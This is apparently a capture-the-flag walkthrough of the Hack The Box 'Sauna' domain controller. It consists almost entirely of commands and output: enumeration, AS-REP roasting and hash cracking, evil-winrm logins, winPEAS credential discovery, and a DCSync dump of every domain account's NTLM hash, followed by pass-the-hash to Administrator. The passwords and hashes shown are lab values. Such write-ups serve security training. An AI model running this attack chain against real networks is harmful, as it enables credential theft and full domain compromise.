# Initial Enumeration
```bash
sudo nmap -sS 10.129.95.180             
[sudo] password for usef: 
Starting Nmap 7.92 ( https://nmap.org ) at 2025-02-15 01:45 +01
Nmap scan report for 10.129.95.180
Host is up (0.13s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 34.20 seconds
```
```bash
netexec smb 10.129.95.180             
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
```

![Screenshot from 2025-02-15 02-58-00](https://github.com/user-attachments/assets/ba925efb-ed03-4ce0-9390-c737155b71a3)
```bash
./username-anarchy Fergus Smith > user.txt
./username-anarchy Shaun Coins >> user.txt
./username-anarchy Hugo Bear >> user.txt
./username-anarchy Bowie Taylor >> user.txt
./username-anarchy Sophie Driver >> user.txt
./username-anarchy Steven Kerb >> user.txt
```
```bash
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.129.95.180 -no-pass -usersfile user.txt 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/home/usef/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:e9e60fe6316484439313d752ff2fbf41$029061e83b651b704b9be56007bdeec6a997b5369f3ac607dcfa2a339e556c012c9802059bacda042b14b5a07cb70b598e1e1e5ceaa02432ca799a6b2969010a51649ac7240a710d44d31bee151efb27d60459b55d8d916654731e45fa2ad82abe6dbadd9603de7c699b3edb6e2048e981e482fcbb942a193c1eaa75fa28e8466d2674476134d28867b2ffa6e64f2ccf64e0076befd528d743393497117b712e209ed620f6a3e2b8ab29a150a4f0f23803669a29a2cbf6e9686aca8fa1e1488239b2a0cefce2112478ee8fa4e53c85785f334504d98f21105da41c87d26797bd76699b3ec169a54609e2d7845e2bdcc441fd2f8b3e698ec143bc1313c0dad240
```
```bash
hashcat -m 18200 fsmith.hash ~/HackTheBox/apps/administrator/rock.txt
```
```bash
evil-winrm -u fsmith -p 'Thestrokes23' -i 10.129.95.180       
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..\
*Evil-WinRM* PS C:\Users\FSmith> cd Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
c....................c
```
```bash
evil-winrm -u fsmith -p 'Thestrokes23' -i 10.129.95.180              
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> upload winPEAS.ps1
*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEAS.ps1
<snip>
=========|| Credential Guard Check
The system was unable to find the specified registry value: LsaCfgFlags

=========|| Cached WinLogon Credentials Check
10
However, only the SYSTEM user can view the credentials here: HKEY_LOCAL_MACHINE\SECURITY\Cache
Or, using mimikatz lsadump::cache

=========|| Additonal Winlogon Credentials Check
EGOTISTICALBANK
EGOTISTICALBANK\svc_loanmanager
Moneymakestheworldgoround!
<snip>
```
```bash
 bloodhound-python  -u fsmith -p Thestrokes23 -ns 10.129.95.180 -d egotistical-bank.local -c all
```

![Screenshot from 2025-02-15 03-02-05](https://github.com/user-attachments/assets/2b1ab025-c31b-4d94-a85a-1e77f2673f12)
```bash
ecretsdump.py -outputfile hashes -just-dc EGOTISTICAL-BANK/svc_loanmgr@10.129.95.180  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:3486e64b2254f7fedb34e76fef264b64::
```
```bash
evil-winrm -u administrator -H '823452073d75b9d1cf70ebdf86c7f98e' -i 10.129.95.180
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
2.................a
```




